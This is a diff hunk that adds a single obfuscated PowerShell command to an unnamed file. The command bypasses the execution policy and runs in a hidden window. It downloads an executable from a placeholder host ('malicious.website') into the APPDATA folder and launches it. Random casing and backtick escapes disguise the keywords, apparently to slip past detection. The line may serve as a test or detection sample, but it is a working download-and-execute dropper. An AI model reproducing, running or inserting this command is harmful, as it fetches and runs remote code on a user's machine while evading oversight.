@@ -1,0 +1,1 @@
+POWe`Rs`hElL -ExecutionPolicy BypaSS -NoProfile -WindowStyle hiddeN -Command (n`eW-ObJe`CT SYstEM.NEt.WEBCLIENt)."DoWNl`Oa`DfiLe"( "http://malicious.website/malware.exe", "$env:APPDATA\bad.exe"); sTaRT`-`PrOc`Ess ("$env:APPDATA\bad.exe")
